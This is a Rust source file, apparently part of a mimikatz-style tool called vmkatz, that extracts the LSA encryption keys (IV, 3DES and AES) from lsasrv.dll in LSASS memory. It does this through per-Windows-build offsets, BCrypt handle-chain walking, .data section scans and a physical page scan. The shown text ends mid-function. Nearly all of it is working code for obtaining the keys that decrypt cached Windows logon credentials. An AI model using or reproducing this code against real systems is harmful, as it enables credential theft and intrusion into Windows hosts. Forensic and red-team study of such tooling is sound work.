use aes::cipher::BlockEncrypt;
use aes::{Aes128, Aes256};
use cbc::cipher::{BlockDecryptMut, KeyIvInit};
use des::cipher::generic_array::GenericArray;
use des::cipher::{BlockDecrypt, KeyInit};
use des::TdesEde3;

use crate::error::{VmkatzError, Result};
use crate::lsass::patterns;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

type Des3CbcDec = cbc::Decryptor<TdesEde3>;

// BCrypt handle chain constants.
/// Tag for BCRYPT_HANDLE_KEY struct ("UUUR" LE).
const UUUR_TAG: u32 = 0x5555_5552;
/// Tag for BCRYPT_KEY / BCRYPT_KEY81 struct ("MSSK" LE).
#[cfg(feature = "carve")]
const MSSK_TAG: u32 = 0x4D53_534B;

// BCrypt handle field offsets (x64).
const BCRYPT_HANDLE_TAG_OFF: u64 = 0x04;      // UUUR tag at handle+4
const BCRYPT_HANDLE_KEY_PTR: u64 = 0x10;       // Key object pointer at handle+0x10
const BCRYPT_KEY81_HARDKEY: u64 = 0x38;         // HARD_KEY start in BCRYPT_KEY81
const BCRYPT_KEY_HARDKEY: u64 = 0x18;           // HARD_KEY start in BCRYPT_KEY (legacy)

// BCrypt handle field offsets (x86).
const BCRYPT_HANDLE_KEY_PTR_X86: u64 = 0x0C;   // Key object pointer at handle+0x0C
const BCRYPT_KEY81_HARDKEY_X86: u64 = 0x34;     // HARD_KEY start in x86 BCRYPT_KEY81
const BCRYPT_KEY_HARDKEY_X86: u64 = 0x18;       // HARD_KEY start in x86 BCRYPT_KEY (legacy)

/// Count unique byte values in a slice (stack-allocated histogram).
/// Used for entropy pre-filtering across crypto, dpapi, and carve modules.
pub(super) fn count_unique_bytes(data: &[u8]) -> u16 {
    let mut seen = [false; 256];
    let mut count = 0u16;
    for &b in data {
        if !seen[b as usize] {
            seen[b as usize] = true;
            count += 1;
        }
    }
    count
}

/// Check if data has at least `min` unique byte values (early exit).
#[cfg(feature = "carve")]
pub(super) fn has_min_unique_bytes(data: &[u8], min: u16) -> bool {
    let mut seen = [false; 256];
    let mut count = 0u16;
    for &b in data {
        if !seen[b as usize] {
            seen[b as usize] = true;
            count += 1;
            if count >= min {
                return true;
            }
        }
    }
    false
}

/// Extracted crypto keys from lsasrv.dll.
#[derive(Debug, Clone)]
pub struct CryptoKeys {
    pub iv: [u8; 16],
    pub des_key: Vec<u8>,
    pub aes_key: Vec<u8>,
}

/// RIP-relative displacements from pattern match to crypto global variables.
/// Each LEA instruction at pattern_addr+offset contains a 4-byte RIP-relative disp32
/// pointing to a global variable in lsasrv.dll's .data section.
struct KeyPatternOffsets {
    /// Bytes after pattern start → LEA for InitializationVector (16 bytes)
    iv_disp: i64,
    /// Bytes before pattern start → LEA for h3DesKey BCrypt handle
    des_disp: i64,
    /// Bytes after pattern start → LEA for hAesKey BCrypt handle
    aes_disp: i64,
}

/// Offset sets for different Windows builds.
const KEY_OFFSET_SETS: &[KeyPatternOffsets] = &[
    KeyPatternOffsets { iv_disp: 67, des_disp: -89, aes_disp: 16 },  // LSA_x64_6: Win10 1809+ / Win11
    KeyPatternOffsets { iv_disp: 61, des_disp: -73, aes_disp: 16 },  // LSA_x64_5: Win10 1507-1607
    KeyPatternOffsets { iv_disp: 71, des_disp: -89, aes_disp: 16 },  // LSA_x64_9: Win11 22H2+
    KeyPatternOffsets { iv_disp: 58, des_disp: -89, aes_disp: 16 },  // LSA_x64_8: Win11 early
    KeyPatternOffsets { iv_disp: 62, des_disp: -74, aes_disp: 23 },  // LSA_x64_3: Win8.1 / Server 2012 R2
    KeyPatternOffsets { iv_disp: 59, des_disp: -61, aes_disp: 23 },  // LSA_x64_1: Win7 / Server 2008 R2
    KeyPatternOffsets { iv_disp: 62, des_disp: -70, aes_disp: 23 },  // LSA_x64_2: Win8 / Server 2012
];

/// Extract IV, 3DES key, and AES key from lsasrv.dll.
///
/// Uses pypykatz-compatible offsets from the key initialization pattern:
///   - The pattern ends with `48 8D 15` (LEA RDX, [rip+disp32]) → hAesKey reference
///   - IV reference is at a specific offset AFTER the pattern start
///   - h3DesKey reference is at a specific offset BEFORE the pattern start
pub fn extract_crypto_keys(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    let text = pe
        .find_section(".text")
        .ok_or_else(|| VmkatzError::PatternNotFound(".text section in lsasrv.dll".to_string()))?;

    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size;

    log::info!(
        "lsasrv PE: base=0x{:x}, .text VA=0x{:x}, .text size=0x{:x}, text_base=0x{:x}",
        lsasrv_base,
        text.virtual_address,
        text_size,
        text_base
    );

    // Find the key initialization pattern
    let pattern_result = patterns::find_pattern(
        vmem,
        text_base,
        text_size,
        patterns::LSASRV_KEY_PATTERNS,
        "lsasrv_key_init",
    );

    let (pattern_addr, _pat_idx) = match pattern_result {
        Ok(result) => result,
        Err(e) => {
            log::info!(
                "Key pattern not found in .text ({}), trying .data section fallback...",
                e
            );
            return extract_crypto_keys_data_fallback(vmem, lsasrv_base);
        }
    };

    // Try each offset set until one produces valid results
    for (set_idx, offsets) in KEY_OFFSET_SETS.iter().enumerate() {
        log::info!(
            "Trying offset set {} (IV={}, DES={}, AES={})",
            set_idx,
            offsets.iv_disp,
            offsets.des_disp,
            offsets.aes_disp
        );

        // Resolve RIP-relative addresses for each global
        let iv_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, offsets.iv_disp) {
            Ok(a) => a,
            Err(_) => continue,
        };
        let des_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, offsets.des_disp) {
            Ok(a) => a,
            Err(_) => continue,
        };
        let aes_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, offsets.aes_disp) {
            Ok(a) => a,
            Err(_) => continue,
        };

        log::debug!("  IV global at: 0x{:x}", iv_addr);
        log::debug!("  h3DesKey global at: 0x{:x}", des_addr);
        log::debug!("  hAesKey global at: 0x{:x}", aes_addr);

        // Read IV (16 bytes directly from the global)
        let iv: [u8; 16] = match vmem.read_virt_bytes(iv_addr, 16) {
            Ok(v) => match v.try_into() {
                Ok(arr) => arr,
                Err(_) => continue,
            },
            Err(_) => continue,
        };
        log::debug!("  IV: {}", hex::encode(iv));

        // Extract key bytes from BCrypt handle chain
        let des_key = match extract_bcrypt_key(vmem, des_addr) {
            Ok(k) => k,
            Err(e) => {
                log::info!("  3DES key extraction failed: {}", e);
                continue;
            }
        };
        let aes_key = match extract_bcrypt_key(vmem, aes_addr) {
            Ok(k) => k,
            Err(e) => {
                log::info!("  AES key extraction failed: {}", e);
                continue;
            }
        };

        // Validate key sizes
        if des_key.len() != 24 {
            log::info!("  Invalid 3DES key length: {} (expected 24)", des_key.len());
            continue;
        }
        if aes_key.len() != 16 && aes_key.len() != 32 {
            log::info!(
                "  Invalid AES key length: {} (expected 16 or 32)",
                aes_key.len()
            );
            continue;
        }

        log::info!(
            "Crypto keys extracted: 3DES={} bytes, AES={} bytes",
            des_key.len(),
            aes_key.len()
        );

        return Ok(CryptoKeys {
            iv,
            des_key,
            aes_key,
        });
    }

    // All offset sets failed (likely .data pages paged out → globals read as 0).
    // Fall through to .data section scan which may find handles if some .data pages
    // are accessible (transition PTEs).
    log::info!("All offset sets failed, trying .data section fallback...");
    extract_crypto_keys_data_fallback(vmem, lsasrv_base)
}

/// Fallback: scan lsasrv.dll's .data section for BCrypt key handles.
///
/// The globals h3DesKey, hAesKey, and InitializationVector reside in .data.
/// h3DesKey and hAesKey are pointers to BCRYPT_HANDLE_KEY structs (tag UUUR at +4).
/// The IV is a 16-byte array near these pointers.
///
/// Strategy: scan .data for qwords that look like heap pointers, follow them,
/// check for UUUR tag → MSSK tag chain, extract keys. Then find the IV nearby.
fn extract_crypto_keys_data_fallback(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| VmkatzError::PatternNotFound(".data section in lsasrv.dll".to_string()))?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = data_sec.virtual_size as usize;

    log::info!(
        "Scanning lsasrv .data section for BCrypt handles: base=0x{:x}, size=0x{:x}",
        data_base,
        data_size
    );

    let data = vmem.read_virt_bytes(data_base, data_size)?;

    // Scan .data for qwords pointing to BCRYPT_HANDLE_KEY structs (UUUR tag at +4).
    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;
    let mut earliest_handle: Option<u64> = None;

    for off in (0..data_size.saturating_sub(8)).step_by(8) {
        let ptr = super::types::read_u64_le(&data, off).unwrap_or(0);

        // Quick filter: must look like a heap pointer (user-mode, non-zero, aligned)
        if ptr == 0 || ptr < 0x10000 || ptr & 0x7 != 0 {
            continue;
        }
        let high = ptr >> 48;
        if high != 0 && high != 0xFFFF {
            continue;
        }

        let tag = match vmem.read_virt_u32(ptr + BCRYPT_HANDLE_TAG_OFF) {
            Ok(t) => t,
            Err(_) => continue,
        };
        if tag != UUUR_TAG {
            continue;
        }

        let _key_ptr = match vmem.read_virt_u64(ptr + BCRYPT_HANDLE_KEY_PTR) {
            Ok(p) if p > 0x10000 => p,
            _ => continue,
        };

        let handle_addr = data_base + off as u64;
        if let Ok(key_bytes) = extract_bcrypt_key(vmem, handle_addr) {
            log::info!(
                "Found BCrypt key handle at .data+0x{:x} (VA 0x{:x}): {} bytes",
                off,
                handle_addr,
                key_bytes.len()
            );
            if earliest_handle.is_none_or(|h| off < h as usize) {
                earliest_handle = Some(off as u64);
            }
            match key_bytes.len() {
                24 if des_key.is_none() => des_key = Some(key_bytes),
                16 | 32 if aes_key.is_none() => aes_key = Some(key_bytes),
                _ => {}
            }
        }
        if des_key.is_some() && aes_key.is_some() {
            break;
        }
    }

    let des_key = des_key.ok_or_else(|| VmkatzError::PatternNotFound("3DES key (24 bytes) not found in .data handles".to_string()))?;
    let aes_key = aes_key.ok_or_else(|| VmkatzError::PatternNotFound("AES key (16/32 bytes) not found in .data handles".to_string()))?;
    let earliest_handle = earliest_handle.ok_or_else(|| VmkatzError::PatternNotFound("no BCrypt handle found".to_string()))?;

    let iv = find_iv_near_handles(vmem, &data, data_base, earliest_handle)?;

    log::info!(
        "Crypto keys extracted via .data fallback: 3DES={} bytes, AES={} bytes, IV={}",
        des_key.len(),
        aes_key.len(),
        hex::encode(iv)
    );

    Ok(CryptoKeys {
        iv,
        des_key,
        aes_key,
    })
}

/// Find the InitializationVector in .data near the BCrypt handle globals.
/// The IV is a 16-byte non-zero, non-pointer array.
fn find_iv_near_handles(
    _vmem: &dyn VirtualMemory,
    data: &[u8],
    _data_base: u64,
    handle_offset: u64,
) -> Result<[u8; 16]> {
    let handle_off = handle_offset as usize;

    // Search within ±0x200 of the handle offset, 8-byte aligned
    let search_start = handle_off.saturating_sub(0x200);
    let search_end = (handle_off + 0x200).min(data.len().saturating_sub(16));

    for off in (search_start..search_end).step_by(8) {
        let candidate = &data[off..off + 16];

        // IV should be non-zero
        if candidate.iter().all(|&b| b == 0) {
            continue;
        }

        // Check that the first 8 bytes don't look like a pointer
        let val = super::types::read_u64_le(candidate, 0).unwrap_or(0);
        if val > 0x10000 && (val >> 48 == 0 || val >> 48 == 0xFFFF) && val & 0x7 == 0 {
            continue; // looks like a pointer, skip
        }

        // Check that the second 8 bytes don't look like a pointer either
        let val2 = super::types::read_u64_le(candidate, 8).unwrap_or(0);
        if val2 > 0x10000 && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF) && val2 & 0x7 == 0 {
            continue;
        }

        // Good candidate - should have some entropy (not repeating pattern)
        if count_unique_bytes(candidate) < 4 {
            continue; // too uniform
        }

        log::debug!(
            "IV candidate at .data+0x{:x}: {}",
            off,
            hex::encode(candidate)
        );
        let mut iv = [0u8; 16];
        iv.copy_from_slice(candidate);
        return Ok(iv);
    }

    Err(VmkatzError::PatternNotFound(
        "InitializationVector not found near BCrypt handles in .data".to_string(),
    ))
}

/// Extract crypto keys from lsasrv.dll on Win10 x86.
/// Uses x86-specific patterns with absolute addressing, falls back to .data scan.
pub fn extract_crypto_keys_x86(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    let text = pe
        .find_section(".text")
        .ok_or_else(|| VmkatzError::PatternNotFound(".text section in x86 lsasrv.dll".to_string()))?;

    let text_base = lsasrv_base + text.virtual_address as u64;

    // Try x86 key patterns first
    let pattern_result = patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::LSASRV_KEY_PATTERNS_X86,
        "lsasrv_key_init_x86",
    );

    if let Ok((pattern_addr, _pat_idx)) = pattern_result {
        log::info!("Found x86 key pattern at 0x{:x}, trying absolute address resolution", pattern_addr);
        // Try to resolve key globals from absolute addresses near the pattern
        if let Ok(keys) = extract_crypto_keys_x86_from_pattern(vmem, &pe, lsasrv_base, pattern_addr) {
            return Ok(keys);
        }
    }

    // Fallback: scan .data for BCrypt key handles using 4-byte pointers
    log::info!("x86 pattern-based extraction failed, falling back to .data scan with 32-bit pointers");
    extract_crypto_keys_x86_data_fallback(vmem, lsasrv_base)
}

/// Try to extract crypto keys from absolute addresses near an x86 code pattern.
fn extract_crypto_keys_x86_from_pattern(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
    pattern_addr: u64,
) -> Result<CryptoKeys> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        VmkatzError::PatternNotFound(".data section in x86 lsasrv.dll".to_string())
    })?;
    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_end = data_base + data_sec.virtual_size as u64;

    // Scan for absolute 32-bit addresses in the instruction stream that point to .data
    let search_start = pattern_addr.saturating_sub(0x80);
    let code = vmem.read_virt_bytes(search_start, 0x200)?;

    let mut data_refs: Vec<u64> = Vec::new();
    for i in 0..code.len().saturating_sub(5) {
        // Look for PUSH imm32, MOV reg,[abs32], LEA reg,[abs32]
        let abs_off = match code[i] {
            0x68 | 0xA1 | 0xA3 => i + 1,
            0x8D | 0x8B if i + 1 < code.len() && (code[i+1] & 0xC7) == 0x05 => i + 2,
            0xB8..=0xBF => i + 1, // MOV reg, imm32
            _ => continue,
        };
        if abs_off + 4 > code.len() { continue; }
        let target = u32::from_le_bytes([code[abs_off], code[abs_off+1], code[abs_off+2], code[abs_off+3]]) as u64;
        if target >= data_base && target < data_end {
            data_refs.push(target);
        }
    }

    // Among .data references, find IV (16-byte non-pointer), h3DesKey (UUUR handle), hAesKey (UUUR handle)
    let mut iv: Option<[u8; 16]> = None;
    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;

    for &addr in &data_refs {
        // Check if this is a BCrypt handle (dword pointer → UUUR tag)
        if let Ok(ptr) = vmem.read_virt_u32(addr) {
            let ptr = ptr as u64;
            if ptr > 0x10000 && ptr < 0x8000_0000 {
                if let Ok(tag) = vmem.read_virt_u32(ptr + 4) {
                    if tag == 0x5555_5552 {
                        // UUUR — extract key via x86 handle chain
                        if let Ok(key) = extract_bcrypt_key_x86(vmem, addr) {
                            if key.len() == 24 && des_key.is_none() {
                                des_key = Some(key);
                            } else if (key.len() == 16 || key.len() == 32) && aes_key.is_none() {
                                aes_key = Some(key);
                            }
                        }
                        continue;
                    }
                }
            }
        }

        // Check if this could be the IV (16 bytes of non-zero, non-pointer data)
        if iv.is_none() {
            if let Ok(candidate) = vmem.read_virt_bytes(addr, 16) {
                if candidate.len() == 16 && !candidate.iter().all(|&b| b == 0) && count_unique_bytes(&candidate) >= 4 {
                    let val = super::types::read_u32_le(&candidate, 0).unwrap_or(0) as u64;
                    if !(val > 0x10000 && val < 0x8000_0000) {
                        let mut arr = [0u8; 16];
                        arr.copy_from_slice(&candidate);
                        iv = Some(arr);
                    }
                }
            }
        }
    }

    let iv = iv.ok_or_else(|| VmkatzError::PatternNotFound("x86 IV not found".to_string()))?;
    let des_key = des_key.ok_or_else(|| VmkatzError::PatternNotFound("x86 3DES key not found".to_string()))?;
    let aes_key = aes_key.ok_or_else(|| VmkatzError::PatternNotFound("x86 AES key not found".to_string()))?;

    log::info!("x86 crypto keys from pattern: 3DES={} bytes, AES={} bytes", des_key.len(), aes_key.len());
    Ok(CryptoKeys { iv, des_key, aes_key })
}

/// Fallback: scan lsasrv.dll's .data section for BCrypt key handles using 32-bit pointers.
fn extract_crypto_keys_x86_data_fallback(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| VmkatzError::PatternNotFound(".data section in x86 lsasrv.dll".to_string()))?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = data_sec.virtual_size as usize;

    log::info!(
        "Scanning x86 lsasrv .data for BCrypt handles (32-bit): base=0x{:x}, size=0x{:x}",
        data_base, data_size
    );

    let data = vmem.read_virt_bytes(data_base, data_size)?;

    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;
    let mut earliest_handle: Option<u64> = None;

    // Scan for dwords that look like 32-bit heap pointers → UUUR tag
    for off in (0..data_size.saturating_sub(4)).step_by(4) {
        let ptr = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;

        if ptr == 0 || !(0x10000..0x8000_0000).contains(&ptr) || ptr & 0x3 != 0 {
            continue;
        }

        let tag = match vmem.read_virt_u32(ptr + BCRYPT_HANDLE_TAG_OFF) {
            Ok(t) => t,
            Err(_) => continue,
        };
        if tag != UUUR_TAG {
            continue;
        }

        let handle_addr = data_base + off as u64;
        if let Ok(key_bytes) = extract_bcrypt_key_x86(vmem, handle_addr) {
            log::info!(
                "Found x86 BCrypt key handle at .data+0x{:x}: {} bytes",
                off, key_bytes.len()
            );
            if earliest_handle.is_none_or(|h| off < h as usize) {
                earliest_handle = Some(off as u64);
            }
            match key_bytes.len() {
                24 if des_key.is_none() => des_key = Some(key_bytes),
                16 | 32 if aes_key.is_none() => aes_key = Some(key_bytes),
                _ => {}
            }
        }
        if des_key.is_some() && aes_key.is_some() {
            break;
        }
    }

    let des_key = des_key.ok_or_else(|| VmkatzError::PatternNotFound("x86 3DES key not found in .data handles".to_string()))?;
    let aes_key = aes_key.ok_or_else(|| VmkatzError::PatternNotFound("x86 AES key not found in .data handles".to_string()))?;
    let earliest_handle = earliest_handle.ok_or_else(|| VmkatzError::PatternNotFound("no BCrypt handle found".to_string()))?;
    let iv = find_iv_near_handles_x86(&data, earliest_handle)?;

    log::info!(
        "x86 crypto keys via .data fallback: 3DES={} bytes, AES={} bytes",
        des_key.len(), aes_key.len()
    );

    Ok(CryptoKeys { iv, des_key, aes_key })
}

/// Find the IV in .data near BCrypt handles — x86 version (4-byte aligned, 4-byte pointer filter).
fn find_iv_near_handles_x86(
    data: &[u8],
    handle_offset: u64,
) -> Result<[u8; 16]> {
    let handle_off = handle_offset as usize;
    let search_start = handle_off.saturating_sub(0x200);
    let search_end = (handle_off + 0x200).min(data.len().saturating_sub(16));

    for off in (search_start..search_end).step_by(4) {
        let candidate = &data[off..off + 16];
        if candidate.iter().all(|&b| b == 0) {
            continue;
        }

        // Check first dword doesn't look like a pointer
        let val = super::types::read_u32_le(candidate, 0).unwrap_or(0) as u64;
        if val > 0x10000 && val < 0x8000_0000 && val & 0x3 == 0 {
            continue;
        }

        // Check second dword too
        let val2 = super::types::read_u32_le(candidate, 4).unwrap_or(0) as u64;
        if val2 > 0x10000 && val2 < 0x8000_0000 && val2 & 0x3 == 0 {
            continue;
        }

        if count_unique_bytes(candidate) < 4 {
            continue;
        }

        log::debug!("x86 IV candidate at .data+0x{:x}: {}", off, hex::encode(candidate));
        let mut iv = [0u8; 16];
        iv.copy_from_slice(candidate);
        return Ok(iv);
    }

    Err(VmkatzError::PatternNotFound(
        "x86 InitializationVector not found near BCrypt handles".to_string(),
    ))
}

/// Extract raw key bytes from a BCrypt key handle on x86 (32-bit pointers).
fn extract_bcrypt_key_x86(vmem: &dyn VirtualMemory, handle_addr: u64) -> Result<Vec<u8>> {
    let handle_ptr = vmem.read_virt_u32(handle_addr)? as u64;
    if handle_ptr == 0 || !(0x10000..0x8000_0000).contains(&handle_ptr) {
        return Err(VmkatzError::DecryptionError(format!(
            "Invalid x86 BCrypt handle pointer: 0x{:x}", handle_ptr
        )));
    }

    let handle_tag = vmem.read_virt_u32(handle_ptr + BCRYPT_HANDLE_TAG_OFF)?;
    if handle_tag != UUUR_TAG {
        return Err(VmkatzError::DecryptionError(format!(
            "x86 BCrypt handle tag mismatch: 0x{:08x}", handle_tag
        )));
    }

    let key_ptr = vmem.read_virt_u32(handle_ptr + BCRYPT_HANDLE_KEY_PTR_X86)? as u64;
    if key_ptr == 0 || !(0x10000..0x8000_0000).contains(&key_ptr) {
        return Err(VmkatzError::DecryptionError(format!(
            "Invalid x86 BCrypt key pointer: 0x{:x}", key_ptr
        )));
    }

    let key_tag = vmem.read_virt_u32(key_ptr + BCRYPT_HANDLE_TAG_OFF)?;
    log::debug!("  x86 BCrypt key tag: 0x{:08x} ('{}')", key_tag, tag_to_str(key_tag));

    // Try x86 BCRYPT_KEY81 (+0x34) then BCRYPT_KEY (+0x18), plus empirical variants
    for &hardkey_offset in &[BCRYPT_KEY81_HARDKEY_X86, BCRYPT_KEY_HARDKEY_X86, 0x30, 0x24] {
        let cb_secret = match vmem.read_virt_u32(key_ptr + hardkey_offset) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if cb_secret == 16 || cb_secret == 24 || cb_secret == 32 {
            let key_data = vmem.read_virt_bytes(key_ptr + hardkey_offset + 4, cb_secret as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!("  x86 key at key_obj+0x{:x}: {} bytes", hardkey_offset, cb_secret);
                return Ok(key_data);
            }
        }
    }

    // Fallback: scan for valid key sizes
    for offset in (0x10..0x50u64).step_by(4) {
        let val = match vmem.read_virt_u32(key_ptr + offset) {
            Ok(v) => v,
            Err(_) => continue,
        };
        if val == 16 || val == 24 || val == 32 {
            let key_data = vmem.read_virt_bytes(key_ptr + offset + 4, val as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!("  x86 fallback: key at key_obj+0x{:x}: {} bytes", offset, val);
                return Ok(key_data);
            }
        }
    }

    Err(VmkatzError::DecryptionError(
        "x86: Could not locate HARD_KEY in BCrypt key structure".to_string(),
    ))
}

/// Extract raw key bytes from a BCrypt key handle global variable.
fn extract_bcrypt_key(vmem: &dyn VirtualMemory, handle_addr: u64) -> Result<Vec<u8>> {
    let handle_ptr = vmem.read_virt_u64(handle_addr)?;
    if handle_ptr == 0 || handle_ptr < 0x10000 {
        return Err(VmkatzError::DecryptionError(format!(
            "Invalid BCrypt handle pointer: 0x{:x}",
            handle_ptr
        )));
    }
    // Validate canonical address
    let high = handle_ptr >> 48;
    if high != 0 && high != 0xFFFF {
        return Err(VmkatzError::DecryptionError(format!(
            "Non-canonical BCrypt handle pointer: 0x{:x}",
            handle_ptr
        )));
    }

    log::debug!("  BCrypt handle ptr: 0x{:x}", handle_ptr);

    // BCRYPT_HANDLE_KEY: { cbLength(4), dwMagic(4=UUUR), hAlgorithm(8), key(8), ... }
    let handle_tag = vmem.read_virt_u32(handle_ptr + BCRYPT_HANDLE_TAG_OFF)?;
    log::debug!(
        "  BCrypt handle tag: 0x{:08x} ('{}')",
        handle_tag,
        tag_to_str(handle_tag)
    );

    let key_ptr = vmem.read_virt_u64(handle_ptr + BCRYPT_HANDLE_KEY_PTR)?;
    if key_ptr == 0 || key_ptr < 0x10000 {
        return Err(VmkatzError::DecryptionError(format!(
            "Invalid BCrypt key pointer at handle+0x{:x}: 0x{:x}",
            BCRYPT_HANDLE_KEY_PTR, key_ptr
        )));
    }
    let key_high = key_ptr >> 48;
    if key_high != 0 && key_high != 0xFFFF {
        return Err(VmkatzError::DecryptionError(format!(
            "Non-canonical BCrypt key pointer: 0x{:x}",
            key_ptr
        )));
    }

    log::debug!("  BCrypt key ptr: 0x{:x}", key_ptr);

    // Read BCRYPT_KEY / BCRYPT_KEY81 structure
    let key_tag = vmem.read_virt_u32(key_ptr + BCRYPT_HANDLE_TAG_OFF)?;
    log::debug!(
        "  BCrypt key tag: 0x{:08x} ('{}')",
        key_tag,
        tag_to_str(key_tag)
    );

    // HARD_KEY offset: BCRYPT_KEY81 (Win 8.1+) or BCRYPT_KEY (Win 7/8, smaller struct)
    for &hardkey_offset in &[BCRYPT_KEY81_HARDKEY, BCRYPT_KEY_HARDKEY] {
        let cb_secret = vmem.read_virt_u32(key_ptr + hardkey_offset)?;
        if cb_secret == 16 || cb_secret == 24 || cb_secret == 32 {
            let key_data =
                vmem.read_virt_bytes(key_ptr + hardkey_offset + 4, cb_secret as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!(
                    "  Found key at key_obj+0x{:x}: {} bytes",
                    hardkey_offset,
                    cb_secret
                );
                return Ok(key_data);
            }
        }
    }

    // Fallback: scan for valid key sizes at common offsets
    for offset in (0x10..0x60u64).step_by(4) {
        let val = vmem.read_virt_u32(key_ptr + offset)?;
        if val == 16 || val == 24 || val == 32 {
            let key_data = vmem.read_virt_bytes(key_ptr + offset + 4, val as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!("  Fallback: key at key_obj+0x{:x}: {} bytes", offset, val);
                return Ok(key_data);
            }
        }
    }

    Err(VmkatzError::DecryptionError(
        "Could not locate HARD_KEY in BCrypt key structure".to_string(),
    ))
}

/// Physical scan fallback: find BCRYPT_HANDLE_KEY structures directly in LSASS pages.
///
/// When .data section globals are paged out (reading as 0), the actual BCrypt structures
/// on the heap may still be in physical memory (present or transition pages). This function
/// enumerates LSASS pages, finds UUUR-tagged handles, extracts keys, and resolves IV
/// from the pattern-based RIP-relative address.
pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
    phys: &P,
    vmem: &dyn VirtualMemory,
    lsass_dtb: u64,
    lsasrv_base: u64,
    _lsasrv_size: u32,
) -> Result<CryptoKeys> {
    use crate::paging::translate::PageTableWalker;

    log::info!("Trying physical UUUR scan for BCRYPT handles in LSASS pages");

    let walker = PageTableWalker::new(phys);
    let mut uuur_vaddrs: Vec<u64> = Vec::new();

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return; // Only scan 4KB pages
        }
        let mut page = [0u8; 4096];
        if phys.read_phys(mapping.paddr, &mut page).is_err() {
            return;
        }
        // Scan for UUUR tag at 8-byte aligned positions
        // BCRYPT_HANDLE_KEY: size(4) + tag(4=UUUR) at the start of the struct
        for offset in (0..4096 - 8).step_by(8) {
            let tag = super::types::read_u32_le(&page, offset + 4).unwrap_or(0);
            if tag == 0x5555_5552 {
                // UUUR found
                uuur_vaddrs.push(mapping.vaddr + offset as u64);
            }
        }
    });

    log::info!("Physical scan found {} UUUR candidates", uuur_vaddrs.len());

    if uuur_vaddrs.is_empty() {
        return Err(VmkatzError::PatternNotFound(
            "No BCRYPT_HANDLE_KEY (UUUR) found in LSASS pages".to_string(),
        ));
    }

    // Extract keys from UUUR handles via virtual memory (handles transition pages)
    let mut extracted_keys: Vec<(u64, Vec<u8>)> = Vec::new();
    for &handle_va in &uuur_vaddrs {
        // BCRYPT_HANDLE_KEY: key pointer at +0x10
        let key_ptr = match vmem.read_virt_u64(handle_va + 0x10) {
            Ok(p) if p > 0x10000 => p,
            _ => continue,
        };

        // Try BCRYPT_KEY81 (hardkey at +0x38) and BCRYPT_KEY (hardkey at +0x18)
        for &hardkey_off in &[0x38u64, 0x18] {
            let cb_secret = match vmem.read_virt_u32(key_ptr + hardkey_off) {
                Ok(cb) if cb == 16 || cb == 24 || cb == 32 => cb,
                _ => continue,
            };
            if let Ok(data) = vmem.read_virt_bytes(key_ptr + hardkey_off + 4, cb_secret as usize) {
                if data.iter().any(|&b| b != 0) {
                    log::info!(
                        "Physical scan: key at UUUR 0x{:x} → key_obj 0x{:x}+0x{:x}: {} bytes",
                        handle_va,
                        key_ptr,
                        hardkey_off,
                        cb_secret,
                    );
                    extracted_keys.push((handle_va, data));
                    break;
                }
            }
        }
    }

    log::info!(
        "Physical scan extracted {} keys from UUUR handles",
        extracted_keys.len()
    );

    // Identify 3DES (24B) and AES (16/32B) keys directly — avoid intermediate Vec + .find()
    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;
    for (_, key) in extracted_keys {
        match key.len() {
            24 if des_key.is_none() => des_key = Some(key),
            16 | 32 if aes_key.is_none() => aes_key = Some(key),
            _ => {}
        }
        if des_key.is_some() && aes_key.is_some() {
            break;
        }
    }
    let des_key = des_key.ok_or_else(|| VmkatzError::PatternNotFound("Physical scan: 3DES key (24 bytes) not found".to_string()))?;
    let aes_key = aes_key.ok_or_else(|| VmkatzError::PatternNotFound("Physical scan: AES key (16/32 bytes) not found".to_string()))?;

    // Resolve IV: try pattern-based RIP-relative addresses
    // The IV may be on a different .data page that's accessible even when key globals aren't
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
    let text = pe
        .find_section(".text")
        .ok_or_else(|| VmkatzError::PatternNotFound(".text section in lsasrv.dll".to_string()))?;
    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size;

    let pattern_result = patterns::find_pattern(
        vmem,
        text_base,
        text_size,
        patterns::LSASRV_KEY_PATTERNS,
        "lsasrv_key_init",
    );

